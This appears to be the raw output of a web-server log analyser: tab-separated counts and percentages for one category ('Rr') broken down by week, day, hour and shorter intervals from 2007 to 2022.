W	Rr	1050	0.101	2012	06	17
W	Rr	1271	0.122	2012	06	10
W	Rr	957	0.092	2012	06	03
W	Rr	1249	0.120	2012	05	27
W	Rr	1055	0.102	2012	05	20
W	Rr	1392	0.134	2012	05	13
W	Rr	1140	0.110	2012	05	06
W	Rr	1807	0.174	2012	04	29
W	Rr	1225	0.118	2012	04	22
W	Rr	1264	0.122	2012	04	15
W	Rr	1075	0.103	2012	04	08
W	Rr	1261	0.121	2012	04	01
W	Rr	1345	0.129	2012	03	25
W	Rr	1254	0.121	2012	03	18
W	Rr	1478	0.142	2012	03	11
W	Rr	1503	0.145	2012	03	04
W	Rr	1532	0.147	2012	02	26
W	Rr	1464	0.141	2012	02	19
W	Rr	1154	0.111	2012	02	12
W	Rr	1240	0.119	2012	02	05
W	Rr	1088	0.105	2012	01	29
W	Rr	1125	0.108	2012	01	22
W	Rr	60	0.006	2012	01	15
W	Rr	1472	0.142	2012	01	08
W	Rr	1122	0.108	2012	01	01
W	Rr	888	0.085	2011	12	25
W	Rr	1360	0.131	2011	12	18
W	Rr	1486	0.143	2011	12	11
W	Rr	1330	0.128	2011	12	04
W	Rr	1094	0.105	2011	11	27
W	Rr	1062	0.102	2011	11	20
W	Rr	1123	0.108	2011	11	13
W	Rr	975	0.094	2011	11	06
W	Rr	1264	0.122	2011	10	30
W	Rr	1140	0.110	2011	10	23
W	Rr	1211	0.117	2011	10	16
W	Rr	1236	0.119	2011	10	09
W	Rr	1128	0.109	2011	10	02
W	Rr	1083	0.104	2011	09	25
W	Rr	1451	0.140	2011	09	18
W	Rr	1278	0.123	2011	09	11
W	Rr	1219	0.117	2011	09	04
W	Rr	1316	0.127	2011	08	28
W	Rr	1119	0.108	2011	08	21
W	Rr	1484	0.143	2011	08	14
W	Rr	1671	0.161	2011	08	07
W	Rr	1319	0.127	2011	07	31
W	Rr	1197	0.115	2011	07	24
W	Rr	1504	0.145	2011	07	17
W	Rr	1367	0.132	2011	07	10
W	Rr	1205	0.116	2011	07	03
W	Rr	1333	0.128	2011	06	26
W	Rr	1059	0.102	2011	06	19
W	Rr	1353	0.130	2011	06	12
W	Rr	1275	0.123	2011	06	05
W	Rr	983	0.095	2011	05	29
W	Rr	1262	0.121	2011	05	22
W	Rr	1374	0.132	2011	05	15
W	Rr	1076	0.104	2011	05	08
W	Rr	0	0.000	2011	05	01
W	Rr	0	0.000	2011	04	24
W	Rr	0	0.000	2011	04	17
W	Rr	0	0.000	2011	04	10
W	Rr	0	0.000	2011	04	03
W	Rr	0	0.000	2011	03	27
W	Rr	24	0.002	2011	03	20
W	Rr	1317	0.127	2011	03	13
W	Rr	1258	0.121	2011	03	06
W	Rr	1372	0.132	2011	02	27
W	Rr	1226	0.118	2011	02	20
W	Rr	1524	0.147	2011	02	13
W	Rr	1366	0.132	2011	02	06
W	Rr	958	0.092	2011	01	30
W	Rr	1273	0.123	2011	01	23
W	Rr	1560	0.150	2011	01	16
W	Rr	1472	0.142	2011	01	09
W	Rr	1310	0.126	2011	01	02
W	Rr	798	0.077	2010	12	26
W	Rr	935	0.090	2010	12	19
W	Rr	0	0.000	2010	12	12
W	Rr	0	0.000	2010	12	05
W	Rr	0	0.000	2010	11	28
W	Rr	0	0.000	2010	11	21
W	Rr	0	0.000	2010	11	14
W	Rr	0	0.000	2010	11	07
W	Rr	0	0.000	2010	10	31
W	Rr	0	0.000	2010	10	24
W	Rr	0	0.000	2010	10	17
W	Rr	0	0.000	2010	10	10
W	Rr	0	0.000	2010	10	03
W	Rr	0	0.000	2010	09	26
W	Rr	0	0.000	2010	09	19
W	Rr	0	0.000	2010	09	12
W	Rr	0	0.000	2010	09	05
W	Rr	0	0.000	2010	08	29
W	Rr	0	0.000	2010	08	22
W	Rr	0	0.000	2010	08	15
W	Rr	0	0.000	2010	08	08
W	Rr	0	0.000	2010	08	01
W	Rr	0	0.000	2010	07	25
W	Rr	0	0.000	2010	07	18
W	Rr	0	0.000	2010	07	11
W	Rr	0	0.000	2010	07	04
W	Rr	15	0.001	2010	06	27
W	Rr	914	0.088	2010	06	20
W	Rr	1104	0.106	2010	06	13
W	Rr	1096	0.106	2010	06	06
W	Rr	1171	0.113	2010	05	30
W	Rr	1115	0.107	2010	05	23
W	Rr	1170	0.113	2010	05	16
W	Rr	1334	0.128	2010	05	09
W	Rr	1109	0.107	2010	05	02
W	Rr	1067	0.103	2010	04	25
W	Rr	1212	0.117	2010	04	18
W	Rr	1054	0.101	2010	04	11
W	Rr	1325	0.128	2010	04	04
W	Rr	811	0.078	2010	03	28
W	Rr	1195	0.115	2010	03	21
W	Rr	1338	0.129	2010	03	14
W	Rr	1113	0.107	2010	03	07
W	Rr	1103	0.106	2010	02	28
W	Rr	1290	0.124	2010	02	21
W	Rr	0	0.000	2010	02	14
W	Rr	0	0.000	2010	02	07
W	Rr	0	0.000	2010	01	31
W	Rr	0	0.000	2010	01	24
W	Rr	0	0.000	2010	01	17
W	Rr	0	0.000	2010	01	10
W	Rr	0	0.000	2010	01	03
W	Rr	78	0.008	2009	12	27
W	Rr	945	0.091	2009	12	20
W	Rr	1140	0.110	2009	12	13
W	Rr	1323	0.127	2009	12	06
W	Rr	1518	0.146	2009	11	29
W	Rr	1352	0.130	2009	11	22
W	Rr	1346	0.130	2009	11	15
W	Rr	1416	0.136	2009	11	08
W	Rr	1734	0.167	2009	11	01
W	Rr	1035	0.100	2009	10	25
W	Rr	1297	0.125	2009	10	18
W	Rr	1267	0.122	2009	10	11
W	Rr	1440	0.139	2009	10	04
W	Rr	1521	0.146	2009	09	27
W	Rr	1121	0.108	2009	09	20
W	Rr	875	0.084	2009	09	13
W	Rr	1032	0.099	2009	09	06
W	Rr	1283	0.124	2009	08	30
W	Rr	1214	0.117	2009	08	23
W	Rr	1402	0.135	2009	08	16
W	Rr	1260	0.121	2009	08	09
W	Rr	1404	0.135	2009	08	02
W	Rr	1380	0.133	2009	07	26
W	Rr	1470	0.142	2009	07	19
W	Rr	1750	0.168	2009	07	12
W	Rr	1847	0.178	2009	07	05
W	Rr	1889	0.182	2009	06	28
W	Rr	1312	0.126	2009	06	21
W	Rr	1093	0.105	2009	06	14
W	Rr	1363	0.131	2009	06	07
W	Rr	1251	0.120	2009	05	31
W	Rr	1352	0.130	2009	05	24
W	Rr	1133	0.109	2009	05	17
W	Rr	1887	0.182	2009	05	10
W	Rr	1369	0.132	2009	05	03
W	Rr	1089	0.105	2009	04	26
W	Rr	1160	0.112	2009	04	19
W	Rr	1189	0.114	2009	04	12
W	Rr	1529	0.147	2009	04	05
W	Rr	1155	0.111	2009	03	29
W	Rr	1230	0.118	2009	03	22
W	Rr	1029	0.099	2009	03	15
W	Rr	1234	0.119	2009	03	08
W	Rr	1486	0.143	2009	03	01
W	Rr	1470	0.142	2009	02	22
W	Rr	1198	0.115	2009	02	15
W	Rr	1802	0.173	2009	02	08
W	Rr	1653	0.159	2009	02	01
W	Rr	1346	0.130	2009	01	25
W	Rr	1431	0.138	2009	01	18
W	Rr	1678	0.162	2009	01	11
W	Rr	1591	0.153	2009	01	04
W	Rr	886	0.085	2008	12	28
W	Rr	1148	0.111	2008	12	21
W	Rr	1428	0.137	2008	12	14
W	Rr	1508	0.145	2008	12	07
W	Rr	1194	0.115	2008	11	30
W	Rr	1070	0.103	2008	11	23
W	Rr	1396	0.134	2008	11	16
W	Rr	1255	0.121	2008	11	09
W	Rr	1314	0.126	2008	11	02
W	Rr	1397	0.134	2008	10	26
W	Rr	1638	0.158	2008	10	19
W	Rr	1298	0.125	2008	10	12
W	Rr	430	0.041	2008	10	05
W	Rr	723	0.070	2008	09	28
W	Rr	1308	0.126	2008	09	21
W	Rr	1242	0.120	2008	09	14
W	Rr	1409	0.136	2008	09	07
W	Rr	1142	0.110	2008	08	31
W	Rr	1022	0.098	2008	08	24
W	Rr	1062	0.102	2008	08	17
W	Rr	1188	0.114	2008	08	10
W	Rr	1232	0.119	2008	08	03
W	Rr	1050	0.101	2008	07	27
W	Rr	1272	0.122	2008	07	20
W	Rr	1305	0.126	2008	07	13
W	Rr	1093	0.105	2008	07	06
W	Rr	1182	0.114	2008	06	29
W	Rr	1937	0.186	2008	06	22
W	Rr	1493	0.144	2008	06	15
W	Rr	1083	0.104	2008	06	08
W	Rr	1283	0.124	2008	06	01
W	Rr	1432	0.138	2008	05	25
W	Rr	1726	0.166	2008	05	18
W	Rr	1580	0.152	2008	05	11
W	Rr	2661	0.256	2008	05	04
W	Rr	3648	0.351	2008	04	27
W	Rr	1400	0.135	2008	04	20
W	Rr	1365	0.131	2008	04	13
W	Rr	1213	0.117	2008	04	06
W	Rr	1670	0.161	2008	03	30
W	Rr	1211	0.117	2008	03	23
W	Rr	1144	0.110	2008	03	16
W	Rr	1301	0.125	2008	03	09
W	Rr	1292	0.124	2008	03	02
W	Rr	1427	0.137	2008	02	24
W	Rr	2207	0.212	2008	02	17
W	Rr	1124	0.108	2008	02	10
W	Rr	1561	0.150	2008	02	03
W	Rr	1533	0.148	2008	01	27
W	Rr	1389	0.134	2008	01	20
W	Rr	1133	0.109	2008	01	13
W	Rr	1404	0.135	2008	01	06
W	Rr	976	0.094	2007	12	30
W	Rr	801	0.077	2007	12	23
W	Rr	675	0.065	2007	12	16
W	*BT	R	7060	2014	02	16
D	Rr	248	0.024	2022	05	06
D	Rr	169	0.016	2022	05	05
D	Rr	362	0.035	2022	05	04
D	Rr	282	0.027	2022	05	03
D	Rr	187	0.018	2022	05	02
D	Rr	166	0.016	2022	05	01
D	Rr	0	0.000	2022	04	30
D	Rr	235	0.023	2022	04	29
D	Rr	420	0.040	2022	04	28
D	Rr	498	0.048	2022	04	27
D	Rr	194	0.019	2022	04	26
D	Rr	360	0.035	2022	04	25
D	Rr	158	0.015	2022	04	24
D	Rr	0	0.000	2022	04	23
D	Rr	250	0.024	2022	04	22
D	Rr	188	0.018	2022	04	21
D	Rr	228	0.022	2022	04	20
D	Rr	328	0.032	2022	04	19
D	Rr	161	0.015	2022	04	18
D	Rr	226	0.022	2022	04	17
D	Rr	0	0.000	2022	04	16
D	Rr	167	0.016	2022	04	15
D	Rr	204	0.020	2022	04	14
D	Rr	292	0.028	2022	04	13
D	Rr	504	0.049	2022	04	12
D	Rr	296	0.028	2022	04	11
D	Rr	167	0.016	2022	04	10
D	Rr	0	0.000	2022	04	09
D	Rr	282	0.027	2022	04	08
D	Rr	159	0.015	2022	04	07
D	Rr	338	0.033	2022	04	06
D	Rr	548	0.053	2022	04	05
D	Rr	223	0.021	2022	04	04
D	Rr	120	0.012	2022	04	03
D	Rr	0	0.000	2022	04	02
D	Rr	255	0.025	2022	04	01
D	Rr	281	0.027	2022	03	31
D	Rr	218	0.021	2022	03	30
D	Rr	217	0.021	2022	03	29
D	Rr	283	0.027	2022	03	28
D	Rr	334	0.032	2022	03	27
D	Rr	0	0.000	2022	03	26
D	*BT	R	2131	2008	05	03
d	Rr	125029	12.036	Sun
d	Rr	167480	16.123	Mon
d	Rr	170623	16.426	Tue
d	Rr	169036	16.273	Wed
d	Rr	169131	16.282	Thu
d	Rr	160426	15.444	Fri
d	Rr	77024	7.415	Sat
H	Rr	3	0.000	2022	05	06	23
H	Rr	5	0.000	2022	05	06	22
H	Rr	4	0.000	2022	05	06	21
H	Rr	5	0.000	2022	05	06	20
H	Rr	9	0.001	2022	05	06	19
H	Rr	8	0.001	2022	05	06	18
H	Rr	35	0.003	2022	05	06	17
H	Rr	6	0.001	2022	05	06	16
H	Rr	2	0.000	2022	05	06	15
H	Rr	4	0.000	2022	05	06	14
H	Rr	6	0.001	2022	05	06	13
H	Rr	8	0.001	2022	05	06	12
H	Rr	27	0.003	2022	05	06	11
H	Rr	1	0.000	2022	05	06	10
H	Rr	12	0.001	2022	05	06	09
H	Rr	5	0.000	2022	05	06	08
H	Rr	2	0.000	2022	05	06	07
H	Rr	2	0.000	2022	05	06	06
H	Rr	25	0.002	2022	05	06	05
H	Rr	27	0.003	2022	05	06	04
H	Rr	5	0.000	2022	05	06	03
H	Rr	8	0.001	2022	05	06	02
H	Rr	5	0.000	2022	05	06	01
H	Rr	34	0.003	2022	05	06	00
H	Rr	1	0.000	2022	05	05	23
H	Rr	2	0.000	2022	05	05	22
H	Rr	3	0.000	2022	05	05	21
H	Rr	0	0.000	2022	05	05	20
H	Rr	18	0.002	2022	05	05	19
H	Rr	15	0.001	2022	05	05	18
H	Rr	7	0.001	2022	05	05	17
H	Rr	2	0.000	2022	05	05	16
H	Rr	22	0.002	2022	05	05	15
H	Rr	41	0.004	2022	05	05	14
H	Rr	0	0.000	2022	05	05	13
H	Rr	14	0.001	2022	05	05	12
H	Rr	6	0.001	2022	05	05	11
H	Rr	3	0.000	2022	05	05	10
H	Rr	2	0.000	2022	05	05	09
H	Rr	7	0.001	2022	05	05	08
H	Rr	1	0.000	2022	05	05	07
H	Rr	1	0.000	2022	05	05	06
H	Rr	2	0.000	2022	05	05	05
H	Rr	2	0.000	2022	05	05	04
H	Rr	3	0.000	2022	05	05	03
H	Rr	8	0.001	2022	05	05	02
H	Rr	7	0.001	2022	05	05	01
H	Rr	2	0.000	2022	05	05	00
H	Rr	2	0.000	2022	05	04	23
H	Rr	1	0.000	2022	05	04	22
H	Rr	3	0.000	2022	05	04	21
H	Rr	6	0.001	2022	05	04	20
H	Rr	2	0.000	2022	05	04	19
H	Rr	2	0.000	2022	05	04	18
H	Rr	8	0.001	2022	05	04	17
H	Rr	8	0.001	2022	05	04	16
H	Rr	2	0.000	2022	05	04	15
H	Rr	10	0.001	2022	05	04	14
H	Rr	108	0.010	2022	05	04	13
H	Rr	3	0.000	2022	05	04	12
H	Rr	8	0.001	2022	05	04	11
H	Rr	5	0.000	2022	05	04	10
H	Rr	4	0.000	2022	05	04	09
H	Rr	9	0.001	2022	05	04	08
H	Rr	24	0.002	2022	05	04	07
H	Rr	6	0.001	2022	05	04	06
H	Rr	5	0.000	2022	05	04	05
H	Rr	31	0.003	2022	05	04	04
H	Rr	14	0.001	2022	05	04	03
H	Rr	6	0.001	2022	05	04	02
H	Rr	69	0.007	2022	05	04	01
H	Rr	26	0.003	2022	05	04	00
H	*BT	R	750	2020	12	11	23
h	Rr	40638	3.912	00
h	Rr	39652	3.817	01
h	Rr	40483	3.897	02
h	Rr	40146	3.865	03
h	Rr	38884	3.743	04
h	Rr	36978	3.560	05
h	Rr	36275	3.492	06
h	Rr	35523	3.420	07
h	Rr	34331	3.305	08
h	Rr	32941	3.171	09
h	Rr	33134	3.190	10
h	Rr	36752	3.538	11
h	Rr	36740	3.537	12
h	Rr	38719	3.727	13
h	Rr	45359	4.367	14
h	Rr	51156	4.925	15
h	Rr	55153	5.310	16
h	Rr	55546	5.347	17
h	Rr	56369	5.427	18
h	Rr	55594	5.352	19
h	Rr	54777	5.273	20
h	Rr	51648	4.972	21
h	Rr	47193	4.543	22
h	Rr	44758	4.309	23
4	Rr	1	0.000	2022	05	06	23	45
4	Rr	0	0.000	2022	05	06	23	30
4	Rr	2	0.000	2022	05	06	23	15
4	Rr	0	0.000	2022	05	06	23	00
4	Rr	3	0.000	2022	05	06	22	45
4	Rr	0	0.000	2022	05	06	22	30
4	Rr	1	0.000	2022	05	06	22	15
4	Rr	1	0.000	2022	05	06	22	00
4	Rr	2	0.000	2022	05	06	21	45
4	Rr	0	0.000	2022	05	06	21	30
4	Rr	0	0.000	2022	05	06	21	15
4	Rr	2	0.000	2022	05	06	21	00
4	Rr	3	0.000	2022	05	06	20	45
4	Rr	0	0.000	2022	05	06	20	30
4	Rr	1	0.000	2022	05	06	20	15
4	Rr	1	0.000	2022	05	06	20	00
4	Rr	4	0.000	2022	05	06	19	45
4	Rr	0	0.000	2022	05	06	19	30
4	Rr	2	0.000	2022	05	06	19	15
4	Rr	3	0.000	2022	05	06	19	00
4	Rr	3	0.000	2022	05	06	18	45
4	Rr	2	0.000	2022	05	06	18	30
4	Rr	1	0.000	2022	05	06	18	15
4	Rr	2	0.000	2022	05	06	18	00
4	Rr	3	0.000	2022	05	06	17	45
4	Rr	2	0.000	2022	05	06	17	30
4	Rr	0	0.000	2022	05	06	17	15
4	Rr	30	0.003	2022	05	06	17	00
4	Rr	0	0.000	2022	05	06	16	45
4	Rr	4	0.000	2022	05	06	16	30
4	Rr	1	0.000	2022	05	06	16	15
4	Rr	1	0.000	2022	05	06	16	00
4	Rr	1	0.000	2022	05	06	15	45
4	Rr	1	0.000	2022	05	06	15	30
4	Rr	0	0.000	2022	05	06	15	15
4	Rr	0	0.000	2022	05	06	15	00
4	Rr	1	0.000	2022	05	06	14	45
4	Rr	1	0.000	2022	05	06	14	30
4	Rr	1	0.000	2022	05	06	14	15
4	Rr	1	0.000	2022	05	06	14	00
4	Rr	0	0.000	2022	05	06	13	45
4	Rr	2	0.000	2022	05	06	13	30
4	Rr	0	0.000	2022	05	06	13	15
4	Rr	4	0.000	2022	05	06	13	00
4	Rr	2	0.000	2022	05	06	12	45
4	Rr	5	0.000	2022	05	06	12	30
4	Rr	1	0.000	2022	05	06	12	15
4	Rr	0	0.000	2022	05	06	12	00
4	Rr	3	0.000	2022	05	06	11	45
4	Rr	23	0.002	2022	05	06	11	30
4	Rr	0	0.000	2022	05	06	11	15
4	Rr	1	0.000	2022	05	06	11	00
4	Rr	1	0.000	2022	05	06	10	45
4	Rr	0	0.000	2022	05	06	10	30
4	Rr	0	0.000	2022	05	06	10	15
4	Rr	0	0.000	2022	05	06	10	00
4	Rr	1	0.000	2022	05	06	09	45
4	Rr	3	0.000	2022	05	06	09	30
4	Rr	5	0.000	2022	05	06	09	15
4	Rr	3	0.000	2022	05	06	09	00
4	Rr	1	0.000	2022	05	06	08	45
4	Rr	2	0.000	2022	05	06	08	30
4	Rr	0	0.000	2022	05	06	08	15
4	Rr	2	0.000	2022	05	06	08	00
4	Rr	0	0.000	2022	05	06	07	45
4	Rr	0	0.000	2022	05	06	07	30
4	Rr	1	0.000	2022	05	06	07	15
4	Rr	1	0.000	2022	05	06	07	00
4	Rr	0	0.000	2022	05	06	06	45
4	Rr	1	0.000	2022	05	06	06	30
4	Rr	0	0.000	2022	05	06	06	15
4	Rr	1	0.000	2022	05	06	06	00
4	Rr	3	0.000	2022	05	06	05	45
4	Rr	0	0.000	2022	05	06	05	30
4	Rr	20	0.002	2022	05	06	05	15
4	Rr	2	0.000	2022	05	06	05	00
4	Rr	2	0.000	2022	05	06	04	45
4	Rr	1	0.000	2022	05	06	04	30
4	Rr	21	0.002	2022	05	06	04	15
4	Rr	3	0.000	2022	05	06	04	00
4	Rr	1	0.000	2022	05	06	03	45
4	Rr	2	0.000	2022	05	06	03	30
4	Rr	0	0.000	2022	05	06	03	15
4	Rr	2	0.000	2022	05	06	03	00
4	Rr	2	0.000	2022	05	06	02	45
4	Rr	3	0.000	2022	05	06	02	30
4	Rr	1	0.000	2022	05	06	02	15
4	Rr	2	0.000	2022	05	06	02	00
4	Rr	1	0.000	2022	05	06	01	45
4	Rr	3	0.000	2022	05	06	01	30
4	Rr	0	0.000	2022	05	06	01	15
4	Rr	1	0.000	2022	05	06	01	00
4	Rr	0	0.000	2022	05	06	00	45
4	Rr	29	0.003	2022	05	06	00	30
4	Rr	0	0.000	2022	05	06	00	15
4	Rr	5	0.000	2022	05	06	00	00
4	*BT	R	744	2021	04	12	15	00
6	Rr	10016	0.964	00	00
6	Rr	10104	0.973	00	15
6	Rr	10104	0.973	00	30
6	Rr	10414	1.003	00	45
6	Rr	9777	0.941	01	00
6	Rr	9962	0.959	01	15
6	Rr	10069	0.969	01	30
6	Rr	9844	0.948	01	45
6	Rr	9601	0.924	02	00
6	Rr	10606	1.021	02	15
6	Rr	10330	0.994	02	30
6	Rr	9946	0.957	02	45
6	Rr	9553	0.920	03	00
6	Rr	9486	0.913	03	15
6	Rr	9806	0.944	03	30
6	Rr	11301	1.088	03	45
6	Rr	9747	0.938	04	00
6	Rr	10279	0.990	04	15
6	Rr	9222	0.888	04	30
6	Rr	9636	0.928	04	45
6	Rr	8921	0.859	05	00
6	Rr	9810	0.944	05	15
6	Rr	9454	0.910	05	30
6	Rr	8793	0.846	05	45
6	Rr	9845	0.948	06	00
6	Rr	8935	0.860	06	15
6	Rr	9047	0.871	06	30
6	Rr	8448	0.813	06	45
6	Rr	8863	0.853	07	00
6	Rr	9222	0.888	07	15
6	Rr	9216	0.887	07	30
6	Rr	8222	0.792	07	45
6	Rr	8880	0.855	08	00
6	Rr	8456	0.814	08	15
6	Rr	9000	0.866	08	30
6	Rr	7995	0.770	08	45
6	Rr	8369	0.806	09	00
6	Rr	8402	0.809	09	15
6	Rr	8168	0.786	09	30
6	Rr	8002	0.770	09	45
6	Rr	7890	0.760	10	00
6	Rr	7946	0.765	10	15
6	Rr	8096	0.779	10	30
6	Rr	9202	0.886	10	45
6	Rr	10200	0.982	11	00
6	Rr	8648	0.833	11	15
6	Rr	8941	0.861	11	30
6	Rr	8963	0.863	11	45
6	Rr	10096	0.972	12	00
6	Rr	8751	0.842	12	15
6	Rr	8852	0.852	12	30
6	Rr	9041	0.870	12	45
6	Rr	9546	0.919	13	00
6	Rr	9433	0.908	13	15
6	Rr	10112	0.973	13	30
6	Rr	9628	0.927	13	45
6	Rr	10956	1.055	14	00
6	Rr	11512	1.108	14	15
6	Rr	11423	1.100	14	30
6	Rr	11468	1.104	14	45
6	Rr	12584	1.211	15	00
6	Rr	12081	1.163	15	15
6	Rr	13015	1.253	15	30
6	Rr	13476	1.297	15	45
6	Rr	13606	1.310	16	00
6	Rr	13542	1.304	16	15
6	Rr	13991	1.347	16	30
6	Rr	14014	1.349	16	45
6	Rr	14110	1.358	17	00
6	Rr	13643	1.313	17	15
6	Rr	14089	1.356	17	30
6	Rr	13704	1.319	17	45
6	Rr	13693	1.318	18	00
6	Rr	14183	1.365	18	15
6	Rr	14140	1.361	18	30
6	Rr	14353	1.382	18	45
6	Rr	14913	1.436	19	00
6	Rr	13348	1.285	19	15
6	Rr	13664	1.315	19	30
6	Rr	13669	1.316	19	45
6	Rr	14182	1.365	20	00
6	Rr	13697	1.319	20	15
6	Rr	13017	1.253	20	30
6	Rr	13881	1.336	20	45
6	Rr	13853	1.334	21	00
6	Rr	12730	1.226	21	15
6	Rr	12373	1.191	21	30
6	Rr	12692	1.222	21	45
6	Rr	11927	1.148	22	00
6	Rr	12000	1.155	22	15
6	Rr	11821	1.138	22	30
6	Rr	11445	1.102	22	45
6	Rr	11856	1.141	23	00
6	Rr	11996	1.155	23	15
6	Rr	10722	1.032	23	30
6	Rr	10184	0.980	23	45
5	Rr	1	0.000	2022	05	06	23	55
5	Rr	0	0.000	2022	05	06	23	50
5	Rr	0	0.000	2022	05	06	23	45
5	Rr	0	0.000	2022	05	06	23	40
5	Rr	0	0.000	2022	05	06	23	35
5	Rr	0	0.000	2022	05	06	23	30
5	Rr	0	0.000	2022	05	06	23	25
5	Rr	0	0.000	2022	05	06	23	20
5	Rr	2	0.000	2022	05	06	23	15
5	Rr	0	0.000	2022	05	06	23	10
5	Rr	0	0.000	2022	05	06	23	05
5	Rr	0	0.000	2022	05	06	23	00
5	Rr	1	0.000	2022	05	06	22	55
5	Rr	2	0.000	2022	05	06	22	50
5	Rr	0	0.000	2022	05	06	22	45
5	Rr	0	0.000	2022	05	06	22	40
5	Rr	0	0.000	2022	05	06	22	35
5	Rr	0	0.000	2022	05	06	22	30
5	Rr	1	0.000	2022	05	06	22	25
5	Rr	0	0.000	2022	05	06	22	20
5	Rr	0	0.000	2022	05	06	22	15
5	Rr	1	0.000	2022	05	06	22	10
5	Rr	0	0.000	2022	05	06	22	05
5	Rr	0	0.000	2022	05	06	22	00
5	Rr	1	0.000	2022	05	06	21	55
5	Rr	1	0.000	2022	05	06	21	50
5	Rr	0	0.000	2022	05	06	21	45
5	Rr	0	0.000	2022	05	06	21	40
5	Rr	0	0.000	2022	05	06	21	35
5	Rr	0	0.000	2022	05	06	21	30
5	Rr	0	0.000	2022	05	06	21	25
5	Rr	0	0.000	2022	05	06	21	20
5	Rr	0	0.000	2022	05	06	21	15
5	Rr	0	0.000	2022	05	06	21	10
5	Rr	1	0.000	2022	05	06	21	05
5	Rr	1	0.000	2022	05	06	21	00
5	Rr	2	0.000	2022	05	06	20	55
5	Rr	1	0.000	2022	05	06	20	50
5	Rr	0	0.000	2022	05	06	20	45
5	Rr	0	0.000	2022	05	06	20	40
5	Rr	0	0.000	2022	05	06	20	35
5	Rr	0	0.000	2022	05	06	20	30
5	Rr	1	0.000	2022	05	06	20	25
5	Rr	0	0.000	2022	05	06	20	20
5	Rr	0	0.000	2022	05	06	20	15
5	Rr	0	0.000	2022	05	06	20	10
5	Rr	0	0.000	2022	05	06	20	05
5	Rr	1	0.000	2022	05	06	20	00
5	Rr	0	0.000	2022	05	06	19	55
5	Rr	4	0.000	2022	05	06	19	50
5	Rr	0	0.000	2022	05	06	19	45
5	Rr	0	0.000	2022	05	06	19	40
5	Rr	0	0.000	2022	05	06	19	35
5	Rr	0	0.000	2022	05	06	19	30
5	Rr	1	0.000	2022	05	06	19	25
5	Rr	1	0.000	2022	05	06	19	20
5	Rr	0	0.000	2022	05	06	19	15
5	Rr	1	0.000	2022	05	06	19	10
5	Rr	1	0.000	2022	05	06	19	05
5	Rr	1	0.000	2022	05	06	19	00
5	Rr	2	0.000	2022	05	06	18	55
5	Rr	0	0.000	2022	05	06	18	50
5	Rr	1	0.000	2022	05	06	18	45
5	Rr	1	0.000	2022	05	06	18	40
5	Rr	0	0.000	2022	05	06	18	35
5	Rr	1	0.000	2022	05	06	18	30
5	Rr	0	0.000	2022	05	06	18	25
5	Rr	0	0.000	2022	05	06	18	20
5	Rr	1	0.000	2022	05	06	18	15
5	Rr	1	0.000	2022	05	06	18	10
5	Rr	1	0.000	2022	05	06	18	05
5	Rr	0	0.000	2022	05	06	18	00
5	Rr	1	0.000	2022	05	06	17	55
5	Rr	1	0.000	2022	05	06	17	50
5	Rr	1	0.000	2022	05	06	17	45
5	Rr	1	0.000	2022	05	06	17	40
5	Rr	0	0.000	2022	05	06	17	35
5	Rr	1	0.000	2022	05	06	17	30
5	Rr	0	0.000	2022	05	06	17	25
5	Rr	0	0.000	2022	05	06	17	20
5	Rr	0	0.000	2022	05	06	17	15
5	Rr	14	0.001	2022	05	06	17	10
5	Rr	0	0.000	2022	05	06	17	05
5	Rr	16	0.002	2022	05	06	17	00
5	Rr	0	0.000	2022	05	06	16	55
5	Rr	0	0.000	2022	05	06	16	50
5	Rr	0	0.000	2022	05	06	16	45
5	Rr	1	0.000	2022	05	06	16	40
5	Rr	1	0.000	2022	05	06	16	35
5	Rr	2	0.000	2022	05	06	16	30
5	Rr	0	0.000	2022	05	06	16	25
5	Rr	1	0.000	2022	05	06	16	20
5	Rr	0	0.000	2022	05	06	16	15
5	Rr	0	0.000	2022	05	06	16	10
5	Rr	1	0.000	2022	05	06	16	05
5	Rr	0	0.000	2022	05	06	16	00
5	Rr	1	0.000	2022	05	06	15	55
5	Rr	0	0.000	2022	05	06	15	50
5	Rr	0	0.000	2022	05	06	15	45
5	Rr	1	0.000	2022	05	06	15	40
5	Rr	0	0.000	2022	05	06	15	35
5	Rr	0	0.000	2022	05	06	15	30
5	Rr	0	0.000	2022	05	06	15	25
5	Rr	0	0.000	2022	05	06	15	20
5	Rr	0	0.000	2022	05	06	15	15
5	Rr	0	0.000	2022	05	06	15	10
5	Rr	0	0.000	2022	05	06	15	05
5	Rr	0	0.000	2022	05	06	15	00
5	Rr	0	0.000	2022	05	06	14	55
5	Rr	1	0.000	2022	05	06	14	50
5	Rr	0	0.000	2022	05	06	14	45
5	Rr	0	0.000	2022	05	06	14	40
5	Rr	1	0.000	2022	05	06	14	35
5	Rr	0	0.000	2022	05	06	14	30
5	Rr	1	0.000	2022	05	06	14	25
5	Rr	0	0.000	2022	05	06	14	20
5	Rr	0	0.000	2022	05	06	14	15
5	Rr	0	0.000	2022	05	06	14	10
5	Rr	0	0.000	2022	05	06	14	05
5	Rr	1	0.000	2022	05	06	14	00
5	Rr	0	0.000	2022	05	06	13	55
5	Rr	0	0.000	2022	05	06	13	50
5	Rr	0	0.000	2022	05	06	13	45
5	Rr	1	0.000	2022	05	06	13	40
5	Rr	1	0.000	2022	05	06	13	35
5	Rr	0	0.000	2022	05	06	13	30
5	Rr	0	0.000	2022	05	06	13	25
5	Rr	0	0.000	2022	05	06	13	20
5	Rr	0	0.000	2022	05	06	13	15
5	Rr	0	0.000	2022	05	06	13	10
5	Rr	0	0.000	2022	05	06	13	05
5	Rr	4	0.000	2022	05	06	13	00
5	Rr	1	0.000	2022	05	06	12	55
5	Rr	1	0.000	2022	05	06	12	50
5	Rr	0	0.000	2022	05	06	12	45
5	Rr	0	0.000	2022	05	06	12	40
5	Rr	0	0.000	2022	05	06	12	35
5	Rr	5	0.000	2022	05	06	12	30
5	Rr	0	0.000	2022	05	06	12	25
5	Rr	1	0.000	2022	05	06	12	20
5	Rr	0	0.000	2022	05	06	12	15
5	Rr	0	0.000	2022	05	06	12	10
5	Rr	0	0.000	2022	05	06	12	05
5	Rr	0	0.000	2022	05	06	12	00
5	Rr	2	0.000	2022	05	06	11	55
5	Rr	1	0.000	2022	05	06	11	50
5	Rr	0	0.000	2022	05	06	11	45
5	Rr	0	0.000	2022	05	06	11	40
5	Rr	1	0.000	2022	05	06	11	35
5	Rr	22	0.002	2022	05	06	11	30
5	Rr	0	0.000	2022	05	06	11	25
5	Rr	0	0.000	2022	05	06	11	20
5	Rr	0	0.000	2022	05	06	11	15
5	Rr	1	0.000	2022	05	06	11	10
5	Rr	0	0.000	2022	05	06	11	05
5	Rr	0	0.000	2022	05	06	11	00
5	Rr	0	0.000	2022	05	06	10	55
